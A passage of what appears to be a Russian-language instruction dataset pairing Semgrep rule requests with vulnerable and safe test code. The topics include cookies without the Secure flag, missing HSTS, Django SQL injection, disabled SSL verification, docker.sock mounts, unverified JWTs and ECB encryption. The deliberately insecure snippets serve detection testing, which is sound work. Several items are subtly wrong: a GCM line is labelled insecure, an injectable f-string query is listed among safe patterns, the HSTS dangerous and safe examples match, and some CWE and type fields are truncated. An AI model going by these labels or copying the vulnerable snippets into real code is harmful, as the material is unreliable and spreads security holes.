exported_activity -->\n        <activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n            </intent-filter>\n\n            <meta-data\n                android:name=\"android.app.lib_name\"\n                android:value=\"\" />\n        </activity>\n    </application>\n\n</manifest>  # Ограничиваем длину\n\nОпасные паттерны:\n• <activity android:name=\".MainActivity\" android:exported=\"true\">...</activity>\n• <activity android:name=\".MainActivity\"><intent-filter>...</intent-filter></activity>\n\nБезопасные паттерны:  \n• <activity android:name=\".cool\" android:exported=\"false\">...</activity>\n• <activity android:name=\".OtherActivity\" android:exported=\"false\"><intent-filter>...</intent-filter></activity>\n\nЛегенда аннотаций:\n- // ruleid:exported_activity: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:exported_activity: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: exported_activity\n  patterns:\n  - pattern-not-inside: <activity ... android:exported=\"false\" ... />\n  - pattern-inside: \"<activity  ... /> \\n\"\n  - pattern-either:\n    - pattern: |\n        <activity ... android:exported=\"true\" ... />\n    - pattern: |\n        <activity ... <intent-filter> ... />\n  message: >-\n    The application exports an activity. Any application on the device can launch the exported activity which may compromise the integrity of your application or its data. \n    Ensure that any exported activities do not have privileged access to your application's control plane.\n  languages:\n  - generic\n  severity: WARNING\n  paths:\n    exclude:\n    - sources/\n    - classes3.dex\n    - '*.so'\n    include:\n    - '*AndroidManifest.xml'\n  metadata:\n    category: security\n    subcategory:\n    - vuln\n    cwe:\n    - 'CWE-926: Improper Export of Android Application Components'\n    confidence: MEDIUM\n    likelihood: MEDIUM\n    impact: MEDIUM\n    owasp:\n    - A5:2021 Security Misconfiguration\n    technology:\n    - Android\n    references:\n    - https://cwe.mitre.org/data/definitions/926.html\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска экспортированных активностей в Android-приложении, которые могут быть запущены любым приложением на устройстве. Анализ выполняется путем поиска тегов <activity> в файле AndroidManifest.xml. Правило использует комбинацию операторов pattern-inside и pattern-not-inside для исключения случаев, когда активность явно помечена как неэкспортируемая. Также проверяется наличие атрибутов android:exported=\"true\" или наличия intent-фильтра, который может указывать на возможность экспорта активности.\n\n# Ключевые элементы:\n- ID: exported_activity\n- Язык: generic \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "exported_activity",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: cookie-setSecure\nОписание уязвимости: Default session middleware settings: `setSecure` not set to true. This ensures that the cookie is sent only over HTTPS to prevent cross-site scripting attacks.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: cookie-setSecure.java\npublic class Bad {\n\n          public void bad2() {\n              Cookie cookie = new Cookie(\"name\", \"value\");\n              // ruleid: cookie-setSecure\n              cookie.setSecure(false);\n          }\n   }\n\n public class Ok {\n          public void ok1() {\n             // ok: cookie-setSecure\n             Cookie cookie = new Cookie(\"name\", \"value\");\n             cookie.setSecure(true);\n          }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: cookie-setSecure.java\npublic class Bad {\n    public void bad2() {\n        Cookie cookie = new Cookie(\"name\", \"value\");\n        // ruleid: cookie-setSecure\n        cookie.setSecure(false);\n   \n• // File: another-bad-code.java\npublic class AnotherBadClass {\n    public void anotherBadMethod() {\n        Cookie cookie = new Cookie(\"sessionId\", \"1234567890\");\n        // ruleid: cookie-setSecure\n  \n\nБезопасные паттерны:  \n• // File: good-code.java\npublic class GoodClass {\n    public void goodMethod() {\n        Cookie cookie = new Cookie(\"username\", \"admin\");\n        // ok: cookie-setSecure\n        cookie.setSecure(true);\n• // File: secure-code.java\npublic class SecureClass {\n    public void secureMethod() {\n        Cookie cookie = new Cookie(\"token\", \"abc123\");\n        // ok: cookie-setSecure\n        cookie.setSecure(tr\n\nЛегенда аннотаций:\n- // ruleid:cookie-setSecure: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:cookie-setSecure: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: cookie-setSecure\n    patterns:\n      - patterns:\n          - pattern-inside: |\n              $COOKIE = new Cookie(...);\n              ...\n          - pattern: |\n              $COOKIE.setSecure(false);\n      - pattern-not-inside: |\n          $COOKIE = new Cookie(...);\n          ...\n          $COOKIE.setSecure(true);\n    message: \"Default session middleware settings: `setSecure` not set to true. This\n      ensures that the cookie is sent only over HTTPS to prevent cross-site\n      scripting attacks.\"\n    fix-regex:\n      regex: setSecure\\(false\\)\n      replacement: setSecure(true)\n    metadata:\n      vulnerability: Insecure Transport\n      owasp:\n        - A03:2017 - Sensitive Data Exposure\n        - A02:2021 - Cryptographic Failures\n      cwe:\n        - \"CWE-319: Cleartext Transmission of Sensitive Information\"\n      references:\n        - https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setSecure(boolean)\n        - https://owasp.org/www-community/controls/SecureCookieAttribute\n      category: security\n      technology: \n       - java\n       - cookie\n      subcategory:\n        - audit\n      likelihood: LOW\n      impact: LOW\n      confidence: LOW\n    languages:\n      - java\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда объект класса Cookie создается и затем его метод setSecure вызывается с аргументом false. Паттерн сначала ищет создание объекта Cookie, а затем проверяет вызов метода setSecure с параметром false. Безопасный пример включает явное указание true для параметра secure при создании или настройке объекта Cookie.\n\n# Ключевые элементы:\n- ID: cookie-setSecure\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "cookie-setSecure",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: missing-hsts-header\nОписание уязвимости: The HSTS HTTP response security header is missing, allowing interaction and communication to be sent over the insecure HTTP protocol.\nCWE: CWE-346: Origin Validation Error\nТип анализа: search\nЯзык: csharp",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: search\n- CWE: CWE-346: Origin Validation Error\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-hsts-header.cs\npublic void Configure(IApplicationBuilder app, IHostingEnvironment env)\n{\n    if (env.IsDevelopment())\n    {\n        // ruleid: missing-hsts-header\n        app.UseDeveloperExceptionPage();\n    }\n    else\n    {\n        // ruleid: missing-hsts-header\n        app.UseExceptionHandler(\"/Error\");\n    }\n    // ruleid: missing-hsts-header\n    app.UseHttpsRedirection();\n    // ruleid: missing-hsts-header\n    app.UseStaticFiles();\n    // ruleid: missing-hsts-header\n    app.UseRouting();\n    // ruleid: missing-hsts-header\n    app.UseAuthentication();\n    // ruleid: missing-hsts-header\n    app.UseAuthorization();\n    // ruleid: missing-hsts-header\n    app.UseSession();\n    // ruleid: missing-hsts-header\n    app.UseEndpoints(endpoints =>\n    {\n        endpoints.MapRazorPages();\n    });\n\n}\n\n\npublic void Configure(IApplicationBuilder app, IHostingEnvironment env)\n{\n\n    if (env.IsDevelopment())\n    {\n        app.UseDeveloperExceptionPage();\n    }\n    else\n    {\n        app.UseExceptionHandler(\"/Error\");\n        // ok: missing-hsts-header\n        app.UseHsts();\n    }\n\n    app.UseHttpsRedirection();\n    app.UseStaticFiles();\n\n    app.UseRouting();\n\n    app.UseAuthentication();\n    app.UseAuthorization();\n\n    app.UseSession();\n\n    app.UseEndpoints(endpoints =>\n    {\n        endpoints.MapRazorPages();\n    });\n\n}\n\npublic void ConfigureServices(IServiceCollection services)\n{\n    // ruleid: missing-hsts-header\n    services.AddControllers();\n\n }\n\npublic void ConfigureServices(IServiceCollection services)\n{\n\n    services.AddControllers();\n    // ok: missing-hsts-header\n    services.AddHsts(options =>\n    {\n        options.Preload = true;\n        options.IncludeSubDomains = true;\n        options.MaxAge = TimeSpan.FromDays(365);\n    });\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• public void Configure(IApplicationBuilder app, IHostingEnvironment env) {\n    if (env.IsDevelopment()){\n        app.UseDeveloperExceptionPage();\n    } else{\n        app.UseExceptionHandler(\"/Error\");\n\n• public void ConfigureServices(IServiceCollection services) {\n    services.AddControllers();\n}\n• public void Configure(IApplicationBuilder app, IHostingEnvironment env) {\n    if (env.IsDevelopment()){\n        app.UseDeveloperExceptionPage();\n    } else{\n        app.UseExceptionHandler(\"/Error\");\n\n\nБезопасные паттерны:  \n• public void Configure(IApplicationBuilder app, IHostingEnvironment env) {\n    if (env.IsDevelopment()){\n        app.UseDeveloperExceptionPage();\n    } else{\n        app.UseExceptionHandler(\"/Error\");\n\n• public void ConfigureServices(IServiceCollection services) {\n    services.AddControllers();\n    services.AddHsts(options =>{\n        options.Preload = true;\n        options.IncludeSubDomains = true;\n \n\nЛегенда аннотаций:\n- // ruleid:missing-hsts-header: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-hsts-header: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-hsts-header\n  pattern-either:\n  - patterns:\n    - pattern-inside: |\n        public void Configure(...) {\n            ...\n            (IApplicationBuilder $APP). ...;\n            ...\n        }\n    - focus-metavariable: $APP\n    - pattern-not-inside: |\n        public void Configure(...) {\n            ...\n            (IApplicationBuilder $APP).UseHsts(...);\n            ...\n        }\n  - patterns:\n    - pattern-inside: |\n        public void ConfigureServices(...) {\n            ...\n            (IServiceCollection $SERVICES). ...;\n            ...\n        }\n    - focus-metavariable: $SERVICES\n    - pattern-not-inside: |\n        public void ConfigureServices(...) {\n            ...\n            (IServiceCollection $SERVICES).AddHsts(...);\n            ...\n        }\n  message: The HSTS HTTP response security header is missing, allowing interaction and communication to\n    be sent over the insecure HTTP protocol.\n  metadata:\n    category: security\n    technology:\n    - dotnet\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    cwe:\n    - 'CWE-346: Origin Validation Error'\n    references:\n    - https://cwe.mitre.org/data/definitions/346.html\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - csharp\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска отсутствующего заголовка HSTS в конфигурационных методах ASP.NET Core. Оно использует шаблон внутри метода Configure или ConfigureServices для проверки наличия вызова UseHsts или AddHsts соответственно. Если такие вызовы отсутствуют, то генерируется предупреждение о возможной уязвимости, позволяющей взаимодействие через небезопасный протокол HTTP.\n\n# Ключевые элементы:\n- ID: missing-hsts-header\n- Язык: csharp \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-hsts-header",
      "language": "csharp",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения avoid-query-set-extra\nОписание уязвимости: QuerySet.extra' does not provide safeguards against SQL injection and requires very careful use. SQL injection can lead to critical data being stolen by attackers. Instead of using '.extra', use the Django ORM and parameterized queries such as `People.objects.get(name='Bob')`.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: query-set-extra.py\n# ruleid:avoid-query-set-extra\nEntry.objects.get().extra()\n\n# ruleid:avoid-query-set-extra\nEntry.objects.filter().extra()\n\n# ruleid:avoid-query-set-extra\nEntry.objects.update().extra()\n\n# ruleid:avoid-query-set-extra\nEntry.objects.filter().update().extra()\n\n# ruleid:avoid-query-set-extra\nEntry.objects.get({}).filter().update().extra()\n\n# ok:avoid-query-set-extra\nfindings = (\n    Finding.objects.filter(\n        verified=True, severity__in=(\"Critical\", \"High\", \"Medium\", \"Low\", \"Info\")\n    )\n    .prefetch_related(\n        \"test__engagement__product\",\n        \"test__engagement__product__prod_type\",\n        \"test__engagement__risk_acceptance\",\n        \"risk_acceptance_set\",\n        \"reporter\",\n    )\n    .extra(\n        select={\n            \"ra_count\": \"SELECT COUNT(*) FROM dojo_risk_acceptance INNER JOIN \"\n            \"dojo_risk_acceptance_accepted_findings ON \"\n            \"( dojo_risk_acceptance.id = dojo_risk_acceptance_accepted_findings.risk_acceptance_id ) \"\n            \"WHERE dojo_risk_acceptance_accepted_findings.finding_id = dojo_finding.id\",\n        },\n    )\n)\n\n\nexample = input()\n# ruleid:avoid-query-set-extra\nactive_findings = (\n    Finding.objects.filter(\n        verified=True,\n        active=True,\n        severity__in=(\"Critical\", \"High\", \"Medium\", \"Low\", \"Info\"),\n    )\n    .prefetch_related(\n        \"test__engagement__product\",\n        \"test__engagement__product__prod_type\",\n        \"test__engagement__risk_acceptance\",\n        \"risk_acceptance_set\",\n        \"reporter\",\n    )\n    .extra(\n        select={\n            \"ra_count\": f\"SELECT COUNT(*) FROM dojo_risk_acceptance INNER JOIN \"\n            f\"dojo_risk_acceptance_accepted_findings ON \"\n            f\"( dojo_risk_acceptance.id = dojo_risk_acceptance_accepted_findings.risk_acceptance_id ) \"\n            f\"WHERE dojo_risk_acceptance_accepted_findings.finding_id = {example}\",\n        },\n    )\n)\n\nexample = 1\n# ok:avoid-query-set-extra\nactive_findings = (\n    Finding.objects.filter(\n   # Ограничиваем длину\n\nОпасные паттерны:\n• Entry.objects.get().extra()\n• Entry.objects.filter().extra()\n• Entry.objects.update().extra()\n\nБезопасные паттерны:  \n• findings = ... .extra(...)\n• active_findings = ... .extra(...)\n• active_findings = ... .extra(select={...})\n\nЛегенда аннотаций:\n- // ruleid:avoid-query-set-extra: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-query-set-extra: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-query-set-extra\n  message: >-\n    QuerySet.extra' does not provide safeguards against SQL injection and requires\n    very careful use. SQL injection can lead to critical data being stolen by attackers.\n    Instead of using '.extra', use the Django ORM and parameterized queries such as\n    `People.objects.get(name='Bob')`.\n  metadata:\n    source-rule-url: https://bandit.readthedocs.io/en/latest/plugins/b610_django_extra_used.html\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.0/ref/models/querysets/#django.db.models.query.QuerySet.extra\n    - https://semgrep.dev/blog/2020/preventing-sql-injection-a-django-authors-perspective/\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages:\n  - python\n  severity: WARNING\n  patterns:\n  - pattern: $MODEL.extra(...)\n  - pattern-not-inside: '$MODEL.extra(select = {$KEY: \"...\"})'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода 'extra' в объектах QuerySet в Django, который не обеспечивает защиты от инъекций SQL. Правило ищет вызов метода 'extra' вне контекста, где используется параметр 'select'. Безопасным считается использование параметра 'select' с жестко заданными значениями или константами внутри вызова 'extra'. Примеры опасного кода включают вызовы 'get', 'filter', 'update' и цепочки методов, использующие 'extra' без параметров 'select'. Примеры безопасного кода показывают корректное применение 'extra' с параметром 'select'.\n\n# Ключевые элементы:\n- ID: avoid-query-set-extra\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-query-set-extra",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: ssl-verify-none\nОписание уязвимости: SSL verification disabled, this allows for MitM attacks\nCWE: C\nТип анализа: search\nЯзык: rust",
    "input": "Требования:\n- Язык: rust\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: ssl-verify-none.rs\nuse openssl::ssl::{SslMethod, SslConnectorBuilder, SSL_VERIFY_NONE};\n\nlet mut connector = SslConnectorBuilder::new(SslMethod::tls()).unwrap();\n\n// ruleid: ssl-verify-none\nconnector.builder_mut().set_verify(SSL_VERIFY_NONE);\n\n// ok: ssl-verify-none\nconnector.builder_mut().set_verify(SSL_VERIFY_PEER);\n\nlet openssl = OpenSsl::from(connector.build());  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: ssl-verify-none\nconnector.builder_mut().set_verify(openssl::ssl::SSL_VERIFY_NONE);\n• // ruleid: ssl-verify-none\nbuilder.set_verify(openssl::ssl::SSL_VERIFY_NONE);\n\nБезопасные паттерны:  \n• // ok: ssl-verify-none\nconnector.builder_mut().set_verify(openssl::ssl::SSL_VERIFY_PEER);\n• // ok: ssl-verify-none\nbuilder.set_verify(openssl::ssl::SSL_VERIFY_FAIL_IF_NO_PEER_CERT);\n\nЛегенда аннотаций:\n- // ruleid:ssl-verify-none: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ssl-verify-none: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: ssl-verify-none\n    message: SSL verification disabled, this allows for MitM attacks\n    pattern: \"$BUILDER.set_verify(openssl::ssl::SSL_VERIFY_NONE)\"\n    metadata:\n      references:\n        - https://docs.rs/openssl/latest/openssl/ssl/struct.SslContextBuilder.html#method.set_verify\n      technology:\n        - openssl\n      category: security\n      cwe: \"CWE-295: Improper Certificate Validation\"\n      confidence: HIGH\n      likelihood: LOW\n      impact: MEDIUM\n      subcategory: vuln\n    languages: [rust]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования SSL_VERIFY_NONE в Rust-коде, что отключает проверку сертификатов SSL/TLS. Это создает угрозу атак типа man-in-the-middle (MitM), так как позволяет злоумышленникам перехватывать и изменять трафик между клиентом и сервером. Правило использует шаблон '$BUILDER.set_verify(openssl::ssl::SSL_VERIFY_NONE)' для идентификации соответствующего кода.\n\n# Ключевые элементы:\n- ID: ssl-verify-none\n- Язык: rust \n- Тип: v\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ssl-verify-none",
      "language": "rust",
      "severity": "WARNING",
      "rule_type": "v",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: dockerfile-dockerd-socket-mount\nОписание уязвимости: The Dockerfile(image) mounts docker.sock to the container which may allow an attacker already inside of the container to escape container and execute arbitrary commands on the host machine.\nCWE: CWE-862: Missing Authorization\nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: CWE-862: Missing Authorization\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dockerd-socket-mount.dockerfile\nFROM docker:latest\n\nWORKDIR /app\n\n# ruleid: dockerfile-dockerd-socket-mount\nVOLUME /var/run/docker.sock:/var/run/docker.sock\n\n# ok: dockerfile-dockerd-socket-mount\nVOLUME ./app/main.py:/main.py\n\nCMD [\"docker\", \"images\"]  # Ограничиваем длину\n\nОпасные паттерны:\n• FROM docker:latest\nWORKDIR /app\n# ruleid: dockerfile-dockerd-socket-mount\nVOLUME /var/run/docker.sock:/var/run/docker.sock\nCMD [\"docker\", \"images\"]\n• FROM nginx:alpine\nWORKDIR /usr/share/nginx/html\n# ruleid: dockerfile-dockerd-socket-mount\nVOLUME /var/run/docker.sock:/var/run/docker.sock\nCOPY index.html .\n\nБезопасные паттерны:  \n• FROM python:3.8-slim\nWORKDIR /app\n# ok: dockerfile-dockerd-socket-mount\nVOLUME ./app/main.py:/main.py\nCMD [\"python\", \"main.py\"]\n• FROM node:14\nWORKDIR /app\n# ok: dockerfile-dockerd-socket-mount\nVOLUME ./src:/src\nCMD [\"npm\", \"install\", \"&&\", \"npm\", \"start\"]\n\nЛегенда аннотаций:\n- // ruleid:dockerfile-dockerd-socket-mount: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dockerfile-dockerd-socket-mount: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: dockerfile-dockerd-socket-mount\n    message: >-\n        The Dockerfile(image) mounts docker.sock to the container which may allow an attacker already inside of the container\n        to escape container and execute arbitrary commands on the host machine.\n    languages:\n      - dockerfile\n      - yaml\n    severity: ERROR\n    metadata:\n      cwe:\n        - \"CWE-862: Missing Authorization\"\n        - \"CWE-269: Improper Privilege Management\"\n      confidence: HIGH\n      likelihood: MEDIUM\n      impact: HIGH\n      subcategory:\n        - audit\n      technology:\n        - dockerfile\n      category: security\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html\n        - https://redfoxsec.com/blog/insecure-volume-mounts-in-docker/\n        - https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html\n    pattern-either:\n      - patterns:\n        - pattern: VOLUME $X\n        - metavariable-regex:\n            metavariable: $X\n            regex: \"/var/run/docker.sock\"\n      - patterns:\n        - pattern-regex: '- \"/var/run/docker.sock:.*\"'\n        - pattern-inside: |\n            volumes:\n              ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска Dockerfile, который монтирует файл /var/run/docker.sock в контейнер. Такой монтаж может позволить атакующему внутри контейнера выйти за пределы контейнера и выполнить произвольные команды на хост-машине. Анализ выполняется путем поиска директивы VOLUME или регулярного выражения в блоке volumes, где целевой путь содержит /var/run/docker.sock.\n\n# Ключевые элементы:\n- ID: dockerfile-dockerd-socket-mount\n- Язык: dockerfile \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dockerfile-dockerd-socket-mount",
      "language": "dockerfile",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: ruby-jwt-decode-without-verify\nОписание уязвимости: Detected the decoding of a JWT token without a verify step. JWT tokens must be verified before use, otherwise the token's integrity is unknown. This means a malicious actor could forge a JWT token with any claims.\nCWE: CWE-345: Insufficient Verification of Data Authenticity\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-345: Insufficient Verification of Data Authenticity\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: jwt-decode-without-verify.rb\nrequire 'jwt'\n\ndef bad1(hmac_secret)\n    # ruleid: ruby-jwt-decode-without-verify\n    decoded_token = JWT.decode token, hmac_secret, false, { algorithm: 'HS256' }\n    puts decoded_token\nend\n\ndef ok1(hmac_secret)\n    # ok: ruby-jwt-decode-without-verify\n    token = JWT.encode payload, hmac_secret, 'HS256'\n    puts token\n    decoded_token = JWT.decode token, hmac_secret, true, { algorithm: 'HS256' }\n    puts decoded_token\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• decoded_token = JWT.decode token, hmac_secret, false, { algorithm: 'HS256' }\n• JWT.decode(token, secret_key, false, { algorithm: 'RS256' })\n\nБезопасные паттерны:  \n• token = JWT.encode(payload, hmac_secret, 'HS256')\n• decoded_token = JWT.decode(token, hmac_secret, true, { algorithm: 'HS256' })\n\nЛегенда аннотаций:\n- // ruleid:ruby-jwt-decode-without-verify: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ruby-jwt-decode-without-verify: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ruby-jwt-decode-without-verify\n  message: >-\n    Detected the decoding of a JWT token without a verify step.\n    JWT tokens must be verified before use, otherwise the token's\n    integrity is unknown. This means a malicious actor could forge\n    a JWT token with any claims.\n  metadata:\n    cwe:\n    - 'CWE-345: Insufficient Verification of Data Authenticity'\n    owasp:\n    - A08:2021 - Software and Data Integrity Failures\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    category: security\n    technology:\n    - jwt\n    references:\n    - https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [ruby]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      require 'jwt'\n      ...\n  - pattern: |-\n      JWT.decode($PAYLOAD,$SECRET,false,...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования библиотеки Ruby JWT для декодирования токена JWT без предварительного шага проверки. Анализ выполняется путем поиска конструкции 'JWT.decode' с флагом 'false', который указывает на отсутствие проверки подлинности токена перед использованием. Безопасное использование требует флага 'true' или эквивалентных параметров, подтверждающих проверку подписи токена.\n\n# Ключевые элементы:\n- ID: ruby-jwt-decode-without-verify\n- Язык: ruby \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ruby-jwt-decode-without-verify",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения insecure-cipher-mode-ecb\nОписание уязвимости: ECB (Electronic Code Book) is the simplest mode of operation for block ciphers.  Each block of data is encrypted in the same way.  This means identical plaintext blocks will always result in identical ciphertext blocks, which can leave significant patterns in the output. Use a different, cryptographically strong mode instead, such as GCM.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-cipher-mode-ecb.fixed.py\n# cf. https://github.com/PyCQA/bandit/blob/b1411bfb43795d3ffd268bef17a839dee954c2b1/examples/cipher-modes.py\n\nfrom cryptography.hazmat.primitives.ciphers.modes import CBC\nfrom cryptography.hazmat.primitives.ciphers.modes import ECB\n\n\n# Insecure mode\n# ruleid: insecure-cipher-mode-ecb\nmode = cryptography.hazmat.primitives.ciphers.modes.GCM(iv)\n\n# Secure cipher and mode\n# ok: insecure-cipher-mode-ecb\ncipher = AES.new(key, blockalgo.MODE_CTR, iv)\n\n# Secure mode\n# ok: insecure-cipher-mode-ecb\nmode = CBC(iv)\n\n\n// File: insecure-cipher-mode-ecb.py\n# cf. https://github.com/PyCQA/bandit/blob/b1411bfb43795d3ffd268bef17a839dee954c2b1/examples/cipher-modes.py\n\nfrom cryptography.hazmat.primitives.ciphers.modes import CBC\nfrom cryptography.hazmat.primitives.ciphers.modes import ECB\n\n\n# Insecure mode\n# ruleid: insecure-cipher-mode-ecb\nmode = ECB(iv)\n\n# Secure cipher and mode\n# ok: insecure-cipher-mode-ecb\ncipher = AES.new(key, blockalgo.MODE_CTR, iv)\n\n# Secure mode\n# ok: insecure-cipher-mode-ecb\nmode = CBC(iv)  # Ограничиваем длину\n\nОпасные паттерны:\n• mode = cryptography.hazmat.primitives.ciphers.modes.ECB(iv)\n• from cryptography.hazmat.primitives.ciphers.modes import ECB\nmode = ECB(iv)\n\nБезопасные паттерны:  \n• cipher = AES.new(key, blockalgo.MODE_CTR, iv)\n• mode = CBC(iv)\n\nЛегенда аннотаций:\n- // ruleid:insecure-cipher-mode-ecb: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-cipher-mode-ecb: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-cipher-mode-ecb\n  message: >-\n    ECB (Electronic Code Book) is the simplest mode of operation for block ciphers. \n    Each block of data is encrypted in the same way. \n    This means identical plaintext blocks will always result in identical ciphertext blocks, which can leave significant patterns in the output.\n    Use a different, cryptographically strong mode instead, such as GCM.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L101\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    bandit-code: B305\n    references:\n    - https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/#insecure-modes\n    - https://crypto.stackexchange.com/questions/20941/why-shouldnt-i-use-ecb-encryption\n    category: security\n    technology:\n    - cryptography\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n    functional-categories:\n    - crypto::search::mode::cryptography\n  severity: WARNING\n  languages:\n  - python\n  pattern: cryptography.hazmat.primitives.ciphers.modes.ECB($IV)\n  fix: cryptography.hazmat.primitives.ciphers.modes.GCM($IV)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасного режима шифрования ECB (Electronic Code Book) в Python-коде. Правило использует шаблон 'pattern' для поиска импорта модуля 'cryptography.hazmat.primitives.ciphers.modes.ECB', за которым следует вызов конструктора этого класса с параметром $IV. Опасный пример включает непосредственное создание объекта ECB, безопасный пример показывает использование другого безопасного режима шифрования, такого как CBC или GCM.\n\n# Ключевые элементы:\n- ID: insecure-cipher-mode-ecb\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-cipher-mode-ecb",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
